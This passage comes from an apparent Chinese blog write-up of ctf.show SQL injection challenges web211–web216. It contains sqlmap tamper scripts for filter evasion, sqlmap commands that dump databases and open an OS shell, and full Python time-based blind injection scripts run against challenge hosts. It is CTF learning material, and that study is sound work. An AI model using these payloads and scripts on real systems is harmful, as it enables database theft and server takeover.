class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><p>爆库名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://<span class="number">436e4003</span>-030e-<span class="number">46e1</span>-995c-3c196a073685.challenge.ctf.show//api/index.php --method=<span class="string">&quot;PUT&quot;</span> --data <span class="built_in">id</span>=<span class="number">1</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> -batch --safe-url=<span class="string">&quot;436e4003-030e-46e1-995c-3c196a073685.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=yxing.py -dbs</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250104145228202.png" alt="image-20250104145228202"></p><p>爆表名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://<span class="number">436e4003</span>-030e-<span class="number">46e1</span>-995c-3c196a073685.challenge.ctf.show//api/index.php --method=<span class="string">&quot;PUT&quot;</span> --data <span class="built_in">id</span>=<span class="number">1</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> -batch --safe-url=<span class="string">&quot;436e4003-030e-46e1-995c-3c196a073685.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=yxing.py -D ctfshow_web -tables</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250104145528666.png" alt="image-20250104145528666"></p><p>爆列名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://<span class="number">436e4003</span>-030e-<span class="number">46e1</span>-995c-3c196a073685.challenge.ctf.show//api/index.php --method=<span class="string">&quot;PUT&quot;</span> --data <span class="built_in">id</span>=<span class="number">1</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> -batch --safe-url=<span class="string">&quot;436e4003-030e-46e1-995c-3c196a073685.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=yxing.py -D ctfshow_web -T ctfshow_flavia -columns</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250104145641882.png" alt="image-20250104145641882"></p><p>爆flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://<span class="number">436e4003</span>-030e-<span class="number">46e1</span>-995c-3c196a073685.challenge.ctf.show//api/index.php --method=<span class="string">&quot;PUT&quot;</span> --data <span class="built_in">id</span>=<span class="number">1</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> -batch --safe-url=<span class="string">&quot;436e4003-030e-46e1-995c-3c196a073685.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=yxing.py -D ctfshow_web -T ctfshow_flavia -C ctfshow_flagxxa -dump</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250104145804969.png" alt="image-20250104145804969"></p><h2 id="web212-过滤"><a href="#web212-过滤" class="headerlink" title="web212(+*过滤)"></a>web212(+*过滤)</h2><p>不能把空格换为&#x2F;**&#x2F;了，即更改上题脚本，存为yxing1.py使用</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="comment"># noinspection PyUnusedLocal</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27; &#x27;</span>, <span class="built_in">chr</span>(<span class="number">0x09</span>))<span class="comment">#十六进制空格</span></span><br><span class="line">    payload = payload[::-<span class="number">1</span>]</span><br><span class="line">    payload = b64encode(payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    payload = payload[::-<span class="number">1</span>]</span><br><span class="line">    payload = b64encode(payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><p>爆库名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://154a1beb-07af-4b42-aae1-917f3c17a111.challenge.ctf.show//api/index.php --method=<span class="string">&quot;PUT&quot;</span> --data <span class="built_in">id</span>=<span class="number">1</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> -batch --safe-url=<span class="string">&quot;154a1beb-07af-4b42-aae1-917f3c17a111.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=yxing1.py -dbs</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250104152427325.png" alt="image-20250104152427325"></p><p>爆表名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://154a1beb-07af-4b42-aae1-917f3c17a111.challenge.ctf.show//api/index.php --method=<span class="string">&quot;PUT&quot;</span> --data <span class="built_in">id</span>=<span class="number">1</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> -batch --safe-url=<span class="string">&quot;154a1beb-07af-4b42-aae1-917f3c17a111.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=yxing1.py -D ctfshow_web -tables</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250104152526712.png" alt="image-20250104152526712"></p><p>爆列名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://154a1beb-07af-4b42-aae1-917f3c17a111.challenge.ctf.show//api/index.php --method=<span class="string">&quot;PUT&quot;</span> --data <span class="built_in">id</span>=<span class="number">1</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> -batch --safe-url=<span class="string">&quot;154a1beb-07af-4b42-aae1-917f3c17a111.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=yxing1.py -D ctfshow_web -T ctfshow_flavis  -columns</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250104152627237.png" alt="image-20250104152627237"></p><p>爆flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://154a1beb-07af-4b42-aae1-917f3c17a111.challenge.ctf.show//api/index.php --method=<span class="string">&quot;PUT&quot;</span> --data <span class="built_in">id</span>=<span class="number">1</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> -batch --safe-url=<span class="string">&quot;154a1beb-07af-4b42-aae1-917f3c17a111.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=yxing1.py -D ctfshow_web -T ctfshow_flavis  -C ctfshow_flagxsa -dump</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250104152837688.png" alt="image-20250104152837688"></p><h2 id="web213-getshell"><a href="#web213-getshell" class="headerlink" title="web213(getshell)"></a>web213(getshell)</h2><p>在上题基础上还要通过–os-shell一键getshell</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://689dbadd-<span class="number">5582</span>-48d9-8f86-e71080b370d5.challenge.ctf.show//api/index.php --method=<span class="string">&quot;PUT&quot;</span> --data <span class="built_in">id</span>=<span class="number">1</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> -batch --safe-url=<span class="string">&quot;689dbadd-5582-48d9-8f86-e71080b370d5.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=yxing1.py --os-shell</span><br></pre></td></tr></table></figure><p><strong>os-shell的使用条件</strong><br>（1）网站必须是root权限<br>（2）攻击者需要知道网站的绝对路径<br>（3）GPC为off，php主动转义的功能关闭</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250104160325809.png" alt="image-20250104160325809"></p><p>注意在最后cat flag时是cat &#x2F;ctfshow_flag(由于空格错了第一遍没找到)</p><h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><h2 id="web214-数字型无闭合"><a href="#web214-数字型无闭合" class="headerlink" title="web214(数字型无闭合)"></a>web214(数字型无闭合)</h2><p>一直找不到注入点，看了wp和视频，在主页猫那个位置有一个向api&#x2F;index.phpPOST请求的包(但是我用火狐和chrome都抓不到，只有先做着了)</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250104171246576.png" alt="image-20250104171246576"></p><hr><p>后面通过网上看wp发现可以通过猫那个页面的select.js响应找到该页面</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250105125653194.png" alt="image-20250105125653194"></p><hr><p>通过POST传参发现ip和debug两个参数直接插入进查询语句中，测试是否能时间盲注</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">debug=<span class="number">1</span>&amp;ip=<span class="keyword">if</span>(<span class="built_in">ascii</span>(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">99</span>,sleep(<span class="number">2</span>),sleep(<span class="number">5</span>))</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250104172318057.png" alt="image-20250104172318057"></p><p>如图可正常进行时间盲注(数据库第一个字母ASCII码为99，即c)，写脚本来进行时间盲注(第一个手搓的脚本，花了三个小时，但是跑出来那一刻真的感觉好到爆！！！！)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#需要手动输入表名，列名</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_letters + string.digits +<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;,&#x27;</span>+<span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">            payload = <span class="string">f&quot;if(substr(database(),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,sleep(4),0)&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.post(url, data=&#123;<span class="string">&#x27;ip&#x27;</span>: payload, <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">4</span> : </span><br><span class="line">                find += char</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,库名为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> find</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force1</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_letters + string.digits +<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;,&#x27;</span>+<span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">            payload = <span class="string">f&quot;if(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;<span class="subst">&#123;database&#125;</span>&#x27; ),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,sleep(4),0)&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.post(url, data=&#123;<span class="string">&#x27;ip&#x27;</span>: payload, <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">4</span> : </span><br><span class="line">                find += char</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,表名为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force2</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_letters + string.digits +<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;,&#x27;</span>+<span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">            payload = <span class="string">f&quot;if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;<span class="subst">&#123;table&#125;</span>&#x27; ),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,sleep(4),0)&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.post(url, data=&#123;<span class="string">&#x27;ip&#x27;</span>: payload, <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">4</span> : </span><br><span class="line">                find += char</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,列名为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force3</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_letters + string.digits +<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;,&#x27;</span>+<span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">            payload = <span class="string">f&quot;if(substr((select group_concat(<span class="subst">&#123;column&#125;</span>) from <span class="subst">&#123;table&#125;</span> ),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,sleep(4),0)&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.post(url, data=&#123;<span class="string">&#x27;ip&#x27;</span>: payload, <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">4</span> : </span><br><span class="line">                find += char</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,flag为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 指定的URL</span></span><br><span class="line">    url = <span class="string">&#x27;http://0ea25f6a-a556-4083-bb9c-5a0404cf9f21.challenge.ctf.show/api/index.php&#x27;</span></span><br><span class="line">    database=brute_force(url)</span><br><span class="line">    brute_force1(url)</span><br><span class="line">    table=<span class="built_in">input</span>(<span class="string">&quot;请输入表名:&quot;</span>)</span><br><span class="line">    brute_force2(url)</span><br><span class="line">    column=<span class="built_in">input</span>(<span class="string">&quot;请输入列名:&quot;</span>)</span><br><span class="line">    brute_force3(url)</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250104233447913.png" alt="image-20250104233447913"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250104233501594.png" alt="image-20250104233501594"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250104233512981.png" alt="image-20250104233512981"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250104233524471.png" alt="image-20250104233524471"></p><h2 id="web215-单引号闭合"><a href="#web215-单引号闭合" class="headerlink" title="web215(单引号闭合)"></a>web215(单引号闭合)</h2><p>和上题一样的向api&#x2F;index.phpPOST传参ip和debug，只不过要用单引号闭合，构造payload进行测试</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">debug=<span class="number">1</span>&amp;ip=<span class="number">1</span><span class="string">&#x27; or if(ascii(substr(database(),1,1))=99,sleep(2),sleep(5))#</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250105104441334.png" alt="image-20250105104441334"></p><p>测试成功，更改上题脚本来进行时间盲注</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#需要手动输入表名，列名</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_letters + string.digits +<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;,&#x27;</span>+<span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">            payload = <span class="string">f&quot;1&#x27; or if(substr(database(),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,sleep(4),0)#&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.post(url, data=&#123;<span class="string">&#x27;ip&#x27;</span>: payload, <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">4</span> : </span><br><span class="line">                find += char</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,库名为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> find</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force1</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_letters + string.digits +<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;,&#x27;</span>+<span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">            payload = <span class="string">f&quot;1&#x27; or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;<span class="subst">&#123;database&#125;</span>&#x27;),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,sleep(4),0)#&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.post(url, data=&#123;<span class="string">&#x27;ip&#x27;</span>: payload, <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">4</span> : </span><br><span class="line">                find += char</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,表名为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force2</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_letters + string.digits +<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;,&#x27;</span>+<span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">            payload = <span class="string">f&quot;1&#x27; or if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;<span class="subst">&#123;table&#125;</span>&#x27; ),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,sleep(4),0)#&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.post(url, data=&#123;<span class="string">&#x27;ip&#x27;</span>: payload, <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">4</span> : </span><br><span class="line">                find += char</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,列名为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force3</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_letters + string.digits +<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;,&#x27;</span>+<span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">            payload = <span class="string">f&quot;1&#x27; or if(substr((select group_concat(<span class="subst">&#123;column&#125;</span>) from <span class="subst">&#123;table&#125;</span> ),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,sleep(4),0)#&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.post(url, data=&#123;<span class="string">&#x27;ip&#x27;</span>: payload, <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">4</span> : </span><br><span class="line">                find += char</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,flag为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 指定的URL</span></span><br><span class="line">    url = <span class="string">&#x27;http://25d7140b-0e46-4acc-9114-db558df7419d.challenge.ctf.show/api/index.php&#x27;</span></span><br><span class="line">    database=brute_force(url)</span><br><span class="line">    brute_force1(url)</span><br><span class="line">    table=<span class="built_in">input</span>(<span class="string">&quot;请输入表名:&quot;</span>)</span><br><span class="line">    brute_force2(url)</span><br><span class="line">    column=<span class="built_in">input</span>(<span class="string">&quot;请输入列名:&quot;</span>)</span><br><span class="line">    brute_force3(url)</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250105110356267.png" alt="image-20250105110356267"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250105110406964.png" alt="image-20250105110406964"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250105110415079.png" alt="image-20250105110415079"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250105110502713.png" alt="image-20250105110502713"></p><h2 id="web216-括号闭合"><a href="#web216-括号闭合" class="headerlink" title="web216(括号闭合)"></a>web216(括号闭合)</h2><p>题目要求对ip进行base64解码后查询，构造payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#debug=1&amp;ip=if(ascii(substr(database(),1,1))=99,sleep(2),sleep(5))</span></span><br><span class="line">debug=<span class="number">1</span>&amp;ip=aWYoYXNjaWkoc3Vic3RyKGRhdGFiYXNlKCksMSwxKSk9OTksc2xlZXAoMiksc2xlZXAoNSkp</span><br></pre></td></tr></table></figure><p><img 